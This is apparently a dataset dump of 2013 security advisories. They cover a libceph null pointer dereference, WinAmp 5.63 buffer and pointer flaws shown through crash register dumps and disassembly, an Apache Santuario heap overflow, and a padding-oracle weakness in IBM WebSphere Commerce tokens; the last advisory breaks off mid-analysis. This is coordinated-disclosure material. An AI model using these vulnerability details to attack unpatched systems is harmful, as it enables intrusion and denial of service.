< Linux Kernel libceph Null Pointer Dereference Vulnerability (CVE-2013-1059) >
Author - Chanam Park (@hkpco)
Website - http://hkpco.kr/
Date - 2013. 07. 06
0. Introduction
This is very brief advisory just to record the vulnerability which I discovered in my spare time.
A remote attacker, malicious ceph monitor, can make an exploit to cause a denial-of-service condition by sending the crafted auth_reply message.
It could possibly lead to another impacts such as remote code execution if some other vulnerabilities are combined.
An explanation is based on linux kernel 3.10 which is latest version now.
1. What's Ceph?
Check these links below.
http://en.wikipedia.org/wiki/Ceph_(storage)
http://ceph.com/
2. Vulnerability
The vulnerability is triggered by a null pointer dereferencing problem which can raise a kernel crash remotely.
Here, I will show you the code flow about vulnerability.
Let's start with the dispatch() function which handles incoming auth message from the ceph monitor.
http://lxr.linux.no/linux+v3.10/net/ceph/mon_client.c
-------
963 static void dispatch(struct ceph_connection *con, struct ceph_msg *msg)
964 {
965 struct ceph_mon_client *monc = con->private;
966 int type = le16_to_cpu(msg->hdr.type);
967
968 if (!monc)
969 return;
970
971 switch (type) {
972 case CEPH_MSG_AUTH_REPLY:
973 handle_auth_reply(monc, msg); *** [1] ***
974 break;
..
-------
As shown in part [1], It calls handle_auth_reply() once ceph client receives the auth reply message from monitor.
See handle_auth_reply() implementation in the same module, then.
-------
886 static void handle_auth_reply(struct ceph_mon_client *monc,
887 struct ceph_msg *msg)
888 {
889 int ret;
890 int was_auth = 0;
891 int had_debugfs_info, init_debugfs = 0;
892
893 mutex_lock(&monc->mutex);
894 had_debugfs_info = have_debugfs_info(monc);
895 was_auth = ceph_auth_is_authenticated(monc->auth);
896 monc->pending_auth = 0;
897 ret = ceph_handle_auth_reply(monc->auth, msg->front.iov_base, *** [2] ***
898 msg->front.iov_len,
899 monc->m_auth->front.iov_base,
900 monc->m_auth->front_max);
..
-------
At in part [2], It calls ceph_handle_auth_reply().
Move to take a look at the function.
http://lxr.linux.no/linux+v3.10/net/ceph/auth.c
-------
174 int ceph_handle_auth_reply(struct ceph_auth_client *ac,
175 void *buf, size_t len,
176 void *reply_buf, size_t reply_len)
177 {
178 void *p = buf;
179 void *end = buf + len;
180 int protocol;
..
239 ret = ac->ops->handle_reply(ac, result, payload, payload_end);
240 if (ret == -EAGAIN) {
241 ret = ceph_build_auth_request(ac, reply_buf, reply_len); *** [3] ***
242 } else if (ret) {
243 pr_err(""auth method '%s' error %d "", ac->ops->name, ret);
244 }
-------
As you can see in the part [3] above, ceph_build_auth_request() contains a vulnerable code to cause the null pointer dereference.
Let's see how the function implements a vulnerable code below.
http://lxr.linux.no/linux+v3.10/net/ceph/auth.c
-------
144 static int ceph_build_auth_request(struct ceph_auth_client *ac,
145 void *msg_buf, size_t msg_len)
146 {
147 struct ceph_mon_request_header *monhdr = msg_buf;
148 void *p = monhdr + 1;
149 void *end = msg_buf + msg_len;
150 int ret;
151
152 monhdr->have_version = 0;
153 monhdr->session_mon = cpu_to_le16(-1);
154 monhdr->session_mon_tid = 0;
155
156 ceph_encode_32(&p, ac->protocol);
157
158 ret = ac->ops->build_request(ac, p + sizeof(u32), end); *** [3] ***
159 if (ret < 0) {
160 pr_err(""error %d building auth method %s request "", ret,
161 ac->ops->name);
162 goto out;
163 }
164 dout("" built request %d bytes "", ret);
165 ceph_encode_32(&p, ret);
166 ret = p + ret - msg_buf;
167 out:
168 return ret;
169 }
-------
The code above, at part [3], calls a function pointer from ceph_auth_client structure without any value checking whether it's null or something else.
Moreover, you can see in the next part soon, some function pointers in the structure hasn't been defined at all.
Here's the problematic structure prototypes below.
http://lxr.linux.no/linux+v3.9.6/include/linux/ceph/auth.h
-------
..
25 struct ceph_auth_client_ops {
26 const char *name;
27
..
40 /*
41 * build requests and process replies during monitor
42 * handshake. if handle_reply returns -EAGAIN, we build
43 * another request.
44 */
45 int (*build_request)(struct ceph_auth_client *ac, void *buf, void *end); *** [4] ***
..
71 struct ceph_auth_client {
72 u32 protocol; /* CEPH_AUTH_* */
73 void *private; /* for use by protocol implementation */
74 const struct ceph_auth_client_ops *ops; /* null iff protocol==0 */ *** [5] ***
..
-------
At part [4], ceph_auth_client_ops structure has a build_request() as a member variable.
At part [5], ceph_auth_client_ops is defined within ceph_auth_client structure.
If we confirm that the ceph_auth_client_ops structure does not initialize the build_request() function pointer, and that's being used as it is,
the null pointer dereference can easily occur.
Let's see.
http://lxr.linux.no/linux+v3.10/net/ceph/auth_none.c
-------
103 static const struct ceph_auth_client_ops ceph_auth_none_ops = {
104 .name = ""none"",
105 .reset = reset,
106 .destroy = destroy,
107 .is_authenticated = is_authenticated,
108 .should_authenticate = should_authenticate,
109 .handle_reply = handle_reply,
110 .create_authorizer = ceph_auth_none_create_authorizer,
111 .destroy_authorizer = ceph_auth_none_destroy_authorizer,
112 };
113
114 int ceph_auth_none_init(struct ceph_auth_client *ac)
115 {
116 struct ceph_auth_none_info *xi;
117
118 dout(""ceph_auth_none_init %p "", ac);
119 xi = kzalloc(sizeof(*xi), GFP_NOFS);
120 if (!xi)
121 return -ENOMEM;
122
123 xi->starting = true;
124 xi->built_authorizer = false;
125
126 ac->protocol = CEPH_AUTH_NONE;
127 ac->private = xi;
128 ac->ops = &ceph_auth_none_ops; *** [6] ***
129 return 0;
130 }
-------
As shown in the part [6] above, ceph_auth_none_ops structure is being used as a ceph operation with no build_request definition.
Boom!,
3. Patch
Tyler Hicks made a fix for it.
https://git.kernel.org/cgit/linux/kernel/git/sage/ceph-client.git/commit/?id=2cb33cac622afde897aa02d3dcd9fbba8bae839e
4. Credit
Chanam Park discovered this bug.
http://seclists.org/oss-sec/2013/q3/61
5. References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1059
http://www.cvedetails.com/cve/CVE-2013-1059/
http://www.openwall.com/lists/oss-security/2013/07/09/7
https://bugzilla.redhat.com/show_bug.cgi?id=977356
http://ceph.com/git/?p=ceph-client.git;a=commit;h=2cb33cac622afde897aa02d3dcd9fbba8bae839e"
8382,[CVE-2013-4695] WinAmp v5.63 gen_ff.dll links.xml Value Parsing Invalid Pointer Dereference,,CVE-2013-4695,"Inshell Security Advisory
http://www.inshell.net
1. ADVISORY INFORMATION
-----------------------
Product: WinAmp
Vendor URL: www.winamp.com
Type: Pointer Issues [CWE-465]
Date found: 2013-06-05
Date published: 2013-07-01
CVSSv2 Score: 4,4 (AV:L/AC:M/Au:N/C:P/I:P/A:P)
CVE: CVE-2013-4695
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
Inshell Security.
3. VERSIONS AFFECTED
--------------------
WinAmp v5.63, older versions may be affected too.
4. VULNERABILITY DESCRIPTION
----------------------------
An invalid pointer dereference vulnerability has been identified in
WinAmp v5.63.
The application loads the contents of the %APPDATA%WinAmplinks.xml on
startup (the key lngId=""default"") and while browsing through the
bookmarks in the Browser view of the GUI, but does not properly validate
the length of the string loaded from the ""<link name>"" and ""<home url>""
keys before using them in a pointer call in the library gen_ff.dll,
which leads to a invalid pointer dereference condition with possible
code execution.
An attacker needs to force the victim to place an arbitrary links.xml
file into the target directory in order to exploit the vulnerability.
Successful exploits can allow attackers to execute arbitrary code with
the privileges of the user running the application. Failed exploits will
result in a denial-of-service condition.
5. PROOF-OF-CONCEPT (DEBUG)
---------------------------
Registers:
EAX E85130FF
ECX 00430043 winamp.00430043
EDX 00D1F5B4
EBX 00000000
ESP 00D1F598
EBP 00D1F5C4
ESI 023D3170
EDI 7C80934A kernel32.GetTickCount
EIP 073D0EE1 gen_ff.073D0EE1
C 0 ES 0023 32bit 0(FFFFFFFF)
P 1 CS 001B 32bit 0(FFFFFFFF)
A 0 SS 0023 32bit 0(FFFFFFFF)
Z 1 DS 0023 32bit 0(FFFFFFFF)
S 0 FS 003B 32bit 7FFDC000(FFF)
T 0 GS 0000 NULL
D 0
O 0 LastErr ERROR_SUCCESS (00000000)
EFL 00000246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty
ST1 empty
ST2 empty
ST3 empty
ST4 empty
ST5 empty
ST6 empty
ST7 empty
3 2 1 0 E S P U O Z D I
FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
Stackview:
ESP-20 > 00000000
ESP-1C > 00000100
ESP-18 > 00C1F444
ESP-14 > 7C9215F9 ntdll.7C9215F9
ESP-10 > 7C9215F9 ntdll.7C9215F9
ESP-C > 00385D58
ESP-8 > 00163700
ESP-4 > 7C9215F9 ntdll.7C9215F9
ESP ==> > 000000BE
ESP+4 > 00D1F5B4
ESP+8 > 00D1F5A8
ESP+C > 00000003
ESP+10 > 00D1F5C0
ESP+14 > 00D1F5BC
ESP+18 > 00D1F5B8
ESP+1C > 00D1FF14
ESP+20 > 00000900
Vulnerable code part (<link name>):
.text:07363F47 push ebp
.text:07363F48 mov ebp, esp
.text:07363F4A push ecx
.text:07363F4B push 1
.text:07363F4D lea edx, [ebp+var_4]
.text:07363F50 push edx
.text:07363F51 lea eax, [ebp+arg_4]
.text:07363F54 push 0
.text:07363F56 push [ebp+arg_0]
.text:07363F59 mov [ebp+var_4], eax
.text:07363F5C mov eax, [ecx]
.text:07363F5E call dword ptr [eax]
.text:07363F60 leave
.text:07363F61 retn 8
Vulnerable code part (<home url>):
.text:073620F8 push ebp
.text:073620F9 mov ebp, esp
.text:073620FB mov eax, [ecx]
.text:073620FD push 0
.text:073620FF push 0
.text:07362101 lea edx, [ebp+arg_0]
.text:07362104 push edx
.text:07362105 push [ebp+arg_0]
.text:07362108 call dword ptr [eax]
.text:0736210A test eax, eax
.text:0736210C mov eax, [ebp+arg_0]
.text:0736210F jnz short loc_7362114
.text:07362111 mov eax, [ebp+arg_4]
.text:07362114
.text:07362114 loc_7362114: ; CODE XREF:
sub_73620F8+17j
.text:07362114 pop ebp
.text:07362115 retn 8
6. SOLUTION
-----------
Update to latest version v5.64 or newer.
7. REPORT TIMELINE
------------------
2013-06-05: Discovery of the vulnerability
2013-06-06: Vendor acknowledgement of the issue
2013-06-11: Vendor provides custom build that includes a fix
2013-06-12: The issue is still exploitable
2013-06-12: Provided another PoC to clarify the way to exploit
2013-06-13: Vendor provides custom build that includes a fix
2013-06-14: Confirmation that the issue is fixed
2013-06-19: Vendor releases v5.64 which includes the fix
2013-07-01: Coordinated Disclosure
8. REFERENCES
-------------
http://security.inshell.net
http://forums.winamp.com/showthread.php?t=364291"
8383,[CVE-2013-4694] WinAmp v5.63 gen_jumpex.dll and ml_local.dll Multiple Buffer Overflows,,CVE-2013-4694,"Inshell Security Advisory
http://www.inshell.net
1. ADVISORY INFORMATION
-----------------------
Product: WinAmp
Vendor URL: www.winamp.com
Type: Stack-based Buffer Overflow [CWE-121]
Date found: 2013-06-05
Date published: 2013-07-01
CVSSv2 Score: Bug #1: 7,5 (AV:N/AC:L/Au:N/C:P/I:P/A:P)
Bug #2: 3,7 (AV:L/AC:H/Au:N/C:P/I:P/A:P)
CVE: CVE-2013-4694
2. CREDITS
----------
These vulnerabilities were discovered and researched by Julien Ahrens
from Inshell Security.
3. VERSIONS AFFECTED
--------------------
WinAmp v5.63, older versions may be affected too.
4. VULNERABILITY DESCRIPTION (BUG #1)
-------------------------------------
The application loads the directories in %PROGRAMFILES%WinAmpSkins on
startup to determine the skins that have been installed and to list them
in the application menu point ""Skins"" and in the Skins Browser. But the
application does not properly validate the length of the directory name
before passing it as argument to a lstrcpynW call in the library
gen_jumpex.dll, which leads to a buffer overflow condition with possible
code execution.
This flaw is also exploitable via the %APPDATA%WinAmpwinamp.ini. The
application loads the contents on startup, but does not properly
validate the length of the string loaded from the ""skin"" key before
passing it as an argument to the same lstrcpynW call in the library
gen_jumpex.dll, which leads to the same buffer overflow condition.
An attacker either needs to trick the victim to download and apply an
arbitrary skin package in order to exploit the vulnerability or to copy
an arbitrary winamp.ini into the %APPDATA%WinAmp directory. Successful
exploits can allow attackers to execute arbitrary code with the
privileges of the user running the application. Failed exploits will
result in a denial-of-service condition.
4. VULNERABILITY DESCRIPTION (BUG #2)
-------------------------------------
The application loads the string of the GUI ""Search"" field from the
""WinAmp Library"" when entered by a user and after switching to another
menu point, but does not properly validate the length of the string
before passing it as an argument to a GetDlgItemTextW call in the
library ml_local.dll, which leads to a buffer overflow condition with
possible code execution.
An attacker needs local access to the client in order to exploit the
vulnerability. Successful exploits can allow attackers to execute
arbitrary code with the privileges of the user running the application.
Failed exploits will result in a denial-of-service condition.
5. PROOF-OF-CONCEPT (DEBUG) (Bug #1)
------------------------------------
Registers:
EAX 3B3C08EB
ECX 7C80BAFC kernel32.7C80BAFC
EDX 00430010 winamp.00430010
EBX 0000007E
ESP 00C1F290 UNICODE ""CCCCCCCCCCCCCCCCCCCCCCCCCCCC""
EBP 00430043 winamp.00430043
ESI 001961E8
EDI 0000060B
EIP 00430060 winamp.00430060
C 0 ES 0023 32bit 0(FFFFFFFF)
P 1 CS 001B 32bit 0(FFFFFFFF)
A 0 SS 0023 32bit 0(FFFFFFFF)
Z 1 DS 0023 32bit 0(FFFFFFFF)
S 0 FS 003B 32bit 7FFDE000(FFF)
T 0 GS 0000 NULL
D 0
O 0 LastErr ERROR_INVALID_WINDOW_HANDLE (00000578)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty +NaN
ST1 empty
ST2 empty
ST3 empty
ST4 empty
ST5 empty
ST6 empty
ST7 empty
3 2 1 0 E S P U O Z D I
FST 0120 Cond 0 0 0 1 Err 0 0 1 0 0 0 0 0 (LT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
Stackview:
ESP-20 > 00430043 CC winamp.00430043
ESP-1C > 0043004B KC winamp.0043004B
ESP-18 > 7C80BAFC kernel32.7C80BAFC
ESP-14 > 00430043 CC winamp.00430043
ESP-10 > 00430043 CC winamp.00430043
ESP-C > 00430043 CC winamp.00430043
ESP-8 > 00430043 CC winamp.00430043
ESP-4 > 00430043 CC winamp.00430043
ESP ==> > 00430043 CC winamp.00430043
ESP+4 > 00430043 CC winamp.00430043
ESP+8 > 00430043 CC winamp.00430043
ESP+C > 00430043 CC winamp.00430043
ESP+10 > 00430043 CC winamp.00430043
ESP+14 > 00430043 CC winamp.00430043
ESP+18 > 00430043 CC winamp.00430043
ESP+1C > 00430043 CC winamp.00430043
ESP+20 > 00430043 CC winamp.00430043
Vulnerable code part:
.text:1001A5B8 push eax ; lpString2
.text:1001A5B9 lea eax, [ebp+String1]
.text:1001A5BF push eax ; lpString1
.text:1001A5C0 call ds:lstrcpynW
.text:1001A5C6 cmp word ptr [ebp+wParam], si
.text:1001A5CD jnz short loc_1001A5E2
.text:1001A5CF mov dword_100310B4, 1
.text:1001A5D9 cmp [ebp+String1], si
.text:1001A5E0 jz short loc_1001A5E8
.text:1001A5E2
.text:1001A5E2 loc_1001A5E2: ; CODE XREF:
sub_1001A551+7Cj
.text:1001A5E2 mov dword_100310B4, esi
.text:1001A5E8
.text:1001A5E8 loc_1001A5E8: ; CODE XREF:
sub_1001A551+8Fj
.text:1001A5E8 pop esi
.text:1001A5E9 leave
.text:1001A5EA retn
.text:1001A5EA sub_1001A551 endp
5. PROOF-OF-CONCEPT (DEBUG) (Bug #2)
------------------------------------
Registers:
EAX 00000000
ECX 079A9D68 ml_local.079A9D68
EDX 00380608
EBX 00000000
ESP 00C1E46C UNICODE ""CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC""
EBP 00430043 winamp.00430043
ESI 00000000
EDI 00000000
EIP 00430043 winamp.00430043
C 0 ES 0023 32bit 0(FFFFFFFF)
P 1 CS 001B 32bit 0(FFFFFFFF)
A 0 SS 0023 32bit 0(FFFFFFFF)
Z 1 DS 0023 32bit 0(FFFFFFFF)
S 0 FS 003B 32bit 7FFDE000(FFF)
T 0 GS 0000 NULL
D 0
O 0 LastErr ERROR_INVALID_WINDOW_HANDLE (00000578)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty
ST1 empty
ST2 empty
ST3 empty
ST4 empty
ST5 empty
ST6 empty
ST7 empty
3 2 1 0 E S P U O Z D I
FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
Stackview:
ESP-20 > 00430043 CC winamp.00430043
ESP-1C > 00430043 CC winamp.00430043
ESP-18 > 00430043 CC winamp.00430043
ESP-14 > 00430043 CC winamp.00430043
ESP-10 > 00430043 CC winamp.00430043
ESP-C > 00430043 CC winamp.00430043
ESP-8 > 00430043 CC winamp.00430043
ESP-4 > 00430043 CC winamp.00430043
ESP ==> > 00430043 CC winamp.00430043
ESP+4 > 00430043 CC winamp.00430043
ESP+8 > 00430043 CC winamp.00430043
ESP+C > 00430043 CC winamp.00430043
ESP+10 > 00430043 CC winamp.00430043
ESP+14 > 00430043 CC winamp.00430043
ESP+18 > 00430043 CC winamp.00430043
ESP+1C > 00430043 CC winamp.00430043
ESP+20 > 00430043 CC winamp.00430043
Vulnerable code part:
.text:07990871 lea eax, [ebp+WideCharStr]
.text:07990877 push eax ; lpString
.text:07990878 push 3EEh ; nIDDlgItem
.text:0799087D push [ebp+hDlg] ; hDlg
.text:07990880 call ds:GetDlgItemTextW
.text:07990886 lea eax, [ebp+WideCharStr]
[...]
.text:0799097C mov dword_79A9D68, eax
.text:07990981 mov dword_79A9D70, eax
.text:07990986 mov dword_79A9D6C, eax
.text:0799098B mov dword_79ACB54, eax
.text:07990990 pop ebx
.text:07990991 leave
.text:07990992 retn
6. SOLUTION
-----------
Update to latest version v5.64 or newer.
7. REPORT TIMELINE
------------------
2013-06-05: Discovery of the vulnerability
2013-06-06: Vendor acknowledgement of the issue
2013-06-11: Vendor already fixed this issue in v5.7 Beta build 3403
2013-06-12: Confirmation that the issue is fixed
2013-06-19: Vendor releases v5.64 which includes the fix
2013-07-01: Coordinated Disclosure
8. REFERENCES
-------------
http://security.inshell.net
http://forums.winamp.com/showthread.php?t=364291"
8408,CVE-2013-2210,,CVE-2013-2210,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2013-2210: Apache Santuario XML Security for C++ contains a heap
overflow during XPointer evaluation
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Santuario XML Security for C++ library versions
prior to V1.7.2
Description: The attempted fix to address CVE-2013-2154 introduced the
possibility of a heap overflow, possibly leading to arbitrary code
execution, in the processing of malformed XPointer expressions in the
XML Signature Reference processing code.
An attacker could use this to exploit an application performing
signature verification if the application does not block the
evaluation of such references prior to performing the verification
step. The exploit would occur prior to the actual verification of
the signature, so does not require authenticated content.
Mitigation: Applications that do not otherwise prevent the evaluation of
XPointer expressions during signature verification and are using library
versions older than V1.7.2 should upgrade as soon as possible. Distributors
of older versions should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=r1496703
Credit: This issue was reported by Jon Erickson of iSIGHT Partners Labs
References:
http://santuario.apache.org/
http://santuario.apache.org/secadv.data/CVE-2013-2154.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Darwin)
iQIcBAEBCgAGBQJRy4zwAAoJEDeLhFQCJ3lin88QALve0Q1GXUQMQsJeqpS2IKI0
FUHhlVhOBVUOjhT3Q1+TfXHqTubJ6Rb6sAhPHB1YzKkeJwyWcRVKi4/1AVGcp3Nq
e1fBNz3zrLQpYyjkmoPxUv/SADRtn8mbED1/WAJ2K3iQJ951FWkDpC8MTJhlJBEJ
FUh6hXMZJpiA4KGidsAJDpvsqZhOAUKDwxD7s0rdmadc+/dB2PigDXcJxgdG9Dz3
eQYS+UkvhUCAIU8TxJaCqEECGYAe015AikbroMHUdhmNsP4otke2HOBz1xcs8YCb
KyNlm0HmQ7S4Qv0UEeAyCzHXITAw7lRD5tp7/y9ZcHbLPZHAgMtFmcup5O7/xrVb
h9Mh+uZ1C2atEPd/ME3/JqNDSAzxcT+Wa3SEQrnQXUVfpomE3Pztg3EUYPL8x/ln
WO+pobIyTMPTEQ1rTI3LPliG8JDU4QS1HY+VQzlspNsVF2buDrOprgKAYx3MWnz3
/YvThnNNumXx7EjX/KN5RVmLavWSfJSGk725dYcaePAtLNIBHIWbkvZitsJSlrg7
0mTj8eAza79/UYWaWyz0zzd1y5bYq0m582hwSI9r45hdB32agvi5IqkAxhswBHTk
B2xga2QZynAmJGHBmvPXq8fmwFw7VOZ6H+M55fNCHnb4XA96OZGb5+aZCRX2m5+X
Gf+o5DTdMpinSzoT2ax2
=hZu/
-----END PGP SIGNATURE-----"
8440,[CVE-2013-0523] IBM WebSphere Commerce: Encrypted URL Parameter Vulnerable to Padding Oracle Attacks,,CVE-2013-0523,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
VSR Security Advisory
http://www.vsecurity.com/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Advisory Name: Encrypted URL Parameter Vulnerable to Padding Oracle Attacks
Release Date: 2013-06-19
Application: IBM WebSphere Commerce
Versions: 5.6.X, 6.0.X, 7.0.X, possibly others
Credit: Timothy D. Morgan <tmorgan (a) vsecurity . com>
George D. Gal <ggal (a) vsecurity . com>
Vendor Status: Patch Available by Request [5]
CVE Candidate: CVE-2013-0523
Reference: http://www.vsecurity.com/resources/advisory/20130619-1/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Product Description
~-----------------~
- From [1]:
""E-commerce is no longer simply about selling online, it's about delivering a
consistent shopping experience across all customer touchpoints, including
mobile, social and in-store. WebSphere Commerce allows you to deliver a
seamless, cross-channel shopping experience through contextually relevant
content, marketing and promotions, while extending your brand across all
digital and physical customer touchpoints.""
Vulnerability Overview
~--------------------~
In February 2013, VSR identified a vulnerability in the IBM WebSphere Commerce
framework which could allow an attacker to tamper with values stored in the
""krypto"" URL parameter. This parameter is encrypted with a block cipher without
any independent integrity protection. This, combined with observed application
behavior, allows for padding oracle attacks which can be used to decrypt the
krypto token and forge new tokens with arbitrary embedded parameters.
Additionally, in various deployment scenarios these tokens are commonly sent to
third-party sites such as IBM Coremetrics, but may also be indirectly leaked to
third-party e-commerce partners or content acceleration providers such as Akamai
Edgesuite, etc. Sensitive data, including user passwords and personally
identifiable information could be compromised in this process. In addition,
modification of token plaintext could allow for a variety of
application-specific attacks, including injections and/or authorization
bypasses.
Product Background
~----------------~
IBM WebSphere Commerce is an extensive e-commerce framework implemented as a
J2EE application. The framework passes some state information related to user
sessions inside a ""krypto"" URL parameter. This parameter is encrypted using
triple-DES in CBC mode. The plaintext of this encrypted token contains a set
of name-value pairs which are formatted as URL parameters. The values stored
in this token can be configured by developers and administrators, meaning
this will likely vary from one deployment to another. More information on
this parameter can be found in [2].
Vulnerability Details
~-------------------~
During preliminary analysis of krypto token values, VSR first collected several
samples of tokens from different pages in a given application and then used the
Bletchley tool set [3] to analyze the tokens in a black box manner. The
following is a partial transcript of using bletchley-analyze:
tmorgan@mallory:/tmp$ cat krypto-samples.txt
I6fnyg3itBEDqqEXA4iVh6pWX%2F1sV8cK%2F5EnIc4o7CO97FsqvYek69S6AeVC3AUNz1gPfhyFrOKW%0AOPRmUET6%2FI%2F9PmU8n3uqnVrCtwYc4mfA8H6P40AejGHeSc4i0JpQM%2B8iSOj8G9Yp09q%2BeuIiqbuT%0Af2zPnMoCn%2FnePOgwdxm1RwOxV0sr%2Btt98dq2dvliMgCeSGUh5NN5mlMTzabDjPz8MyevH%2BN4kv1h%0AAb%2FrasI8FYHpUwQvk%2BwXz56ORc4WvHLjZOChYTg2xmkiz9c1cHRizvcRTSiAZhtYr2bJlm0%3D
I6fnyg3itBEDqqEXA4iVh8EA%2BplSfftJ%2FiI7fedFhotK2UQO6R5GrtcU%2FTBgrikkzJnc4aGbRJBJ%0ACYhQPdJ30jywWbF7bhagi7sCp7gY3AYGmKguu4T9WZFOGQInC1SZZ7Bd5te42htqd2zwvGK4JwML%0AGPAFpvkRiVJ942TZjY7oiOMoPLn6m11fh%2BzJ6EIf5rJA4OLEs%2FvCyOGYAf%2BIsK1lZos6lhRm
CQ2t4AN6010sy2%2F%2Bu9qQNHX8Qp6yRJFze5o6la5k7qfUjXL%2BY8lWvGx5%2BdZKVmwU4N%2F020srhSN1%0A%2BLboqUj7qWg0DssiH1MZO1ZNxZ0lnrlXc7%2B6jfUOlSnoPiNKVwPaig%2FmKyU376c%3D
CQ2t4AN6010sy2%2F%2Bu9qQNHX8Qp6yRJFze5o6la5k7qeHDyGuXbwAJYvXlwM7yoEnWLXpyh%2BKP2qY%0AoCW66GPT4T1OCLehYCwMyvICI2PQ%2FgoVt81WF29eINhC0QwIbg5p
tmorgan@mallory:/tmp$ bletchley-analyze krypto-samples.txt
...
Beginning analysis after decoding by chain:
percent/upper-plus,base64/rfc3548-newline
Unique Lengths: 96,104,168,224
Maximum Possible Block Size: 8
Matching Common Block Sizes: 8
Possible Encodings:
Best Encoding: None
First 4 Values:
0000: 23a7e7ca0de2b411 03aaa11703889587 aa565ffd6c57c70a ff912721ce28ec23 |
""#xa7xe7xca xe2xb4x11x03xaaxa1x17x03x88x95x87xaaV_xfdlWxc7 xffx91'!xce(xec#""
0040: bdec5b2abd87a4eb d4ba01e542dc050d cf580f7e1c85ace2 9638f4665044fafc |
'xbdxec[*xbdx87xa4xebxd4xbax01xe5Bxdcx05 xcfXx0f~x1cx85xacxe2x968xf4fPDxfaxfc'
0080: 8ffd3e653c9f7baa 9d5ac2b7061ce267 c0f07e8fe3401e8c 61de49ce22d09a50 |
'x8fxfd>e<x9f{xaax9dZxc2xb7x06x1cxe2gxc0xf0~x8fxe3@x1ex8caxdeIxce""xd0x9aP'
00C0: 33ef2248e8fc1bd6 29d3dabe7ae222a9 bb937f6ccf9cca02 9ff9de3ce8307719 |
'3xef""Hxe8xfcx1bxd6)xd3xdaxbezxe2""xa9xbbx93x7flxcfx9cxcax02x9fxf9xde<xe80wx19'
0100: b54703b1574b2bfa db7df1dab676f962 32009e486521e4d3 799a5313cda6c38c |
'xb5Gx03xb1WK+xfaxdb}xf1xdaxb6vxf9b2x00x9eHe!xe4xd3yx9aSx13xcdxa6xc3x8c'
0140: fcfc3327af1fe378 92fd6101bfeb6ac2 3c1581e953042f93 ec17cf9e8e45ce16 |
""xfcxfc3'xafx1fxe3xx92xfdax01xbfxebjxc2<x15x81xe9Sx04/x93xecx17xcfx9ex8eExcex16""
0180: bc72e364e0a16138 36c66922cfd73570 7462cef7114d2880 661b58af66c9966d |
'xbcrxe3dxe0xa1a86xc6i""xcfxd75ptbxcexf7x11M(x80fx1bXxaffxc9x96m'
0000: 23a7e7ca0de2b411 03aaa11703889587 c100fa99527dfb49 fe223b7de745868b |
'#xa7xe7xca xe2xb4x11x03xaaxa1x17x03x88x95x87xc1x00xfax99R}xfbIxfe"";}xe7Ex86x8b'
0040: 4ad9440ee91e46ae d714fd3060ae2924 cc99dce1a19b4490 490988503dd277d2 |
'Jxd9Dx0exe9x1eFxaexd7x14xfd0`xae)$xccx99xdcxe1xa1x9bDx90I x88P=xd2wxd2'
0080: 3cb059b17b6e16a0 8bbb02a7b818dc06 0698a82ebb84fd59 914e1902270b5499 |
""<xb0Yxb1{nx16xa0x8bxbbx02xa7xb8x18xdcx06x06x98xa8.xbbx84xfdYx91Nx19x02'x0bTx99""
00C0: 67b05de6d7b8da1b 6a776cf0bc62b827 030b18f005a6f911 89527de364d98d8e |
""gxb0]xe6xd7xb8xdax1bjwlxf0xbcbxb8'x03x0bx18xf0x05xa6xf9x11x89R}xe3dxd9x8dx8e""
0100: e888e3283cb9fa9b 5d5f87ecc9e8421f e6b240e0e2c4b3fb c2c8e19801ff88b0 |
'xe8x88xe3(<xb9xfax9b]_x87xecxc9xe8Bx1fxe6xb2@xe0xe2xc4xb3xfbxc2xc8xe1x98x01xffx88xb0'
0140: ad65668b3a961466 |
'xadefx8b:x96x14f'
0000: 090dade0037ad35d 2ccb6ffebbda9034 75fc429eb2449173 7b9a3a95ae64eea7 |
' xadxe0x03zxd3],xcboxfexbbxdax904uxfcBx9exb2Dx91s{x9a:x95xaedxeexa7'
0040: d48d72fe63c956bc 6c79f9d64a566c14 e0dff4db4b2b8523 75f8b6e8a948fba9 |
'xd4x8drxfecxc9Vxbclyxf9xd6JVlx14xe0xdfxf4xdbK+x85#uxf8xb6xe8xa9Hxfbxa9'
0080: 68340ecb221f5319 3b564dc59d259eb9 5773bfba8df50e95 29e83e234a5703da |
'h4x0excb""x1fSx19;VMxc5x9d%x9exb9Wsxbfxbax8dxf5x0ex95)xe8>#JWx03xda'
00C0: 8a0fe62b2537efa7 |
'x8ax0fxe6+%7xefxa7'
0000: 090dade0037ad35d 2ccb6ffebbda9034 75fc429eb2449173 7b9a3a95ae64eea7 |
' xadxe0x03zxd3],xcboxfexbbxdax904uxfcBx9exb2Dx91s{x9a:x95xaedxeexa7'
0040: 870f21ae5dbc0025 8bd797033bca8127 58b5e9ca1f8a3f6a 98a025bae863d3e1 |
""x87x0f!xae]xbcx00%x8bxd7x97x03;xcax81'Xxb5xe9xcax1fx8a?jx98xa0%xbaxe8cxd3xe1""
0080: 3d4e08b7a1602c0c caf2022363d0fe0a 15b7cd56176f5e20 d842d10c086e0e69 |
'=Nx08xb7xa1`,x0cxcaxf2x02#cxd0xfe x15xb7xcdVx17o^
xd8Bxd1x0cx08nx0ei'
These 4 samples have decoded lengths which are consistent with a 64-bit
(8 byte) block cipher (such as DES, 3DES, or blowfish). In addition, the
first two samples share the first two blocks in common (but no others),
while the third and fourth samples have the first four blocks in common.
This pattern is a sign that the ciphertext may be encrypted using CBC mode
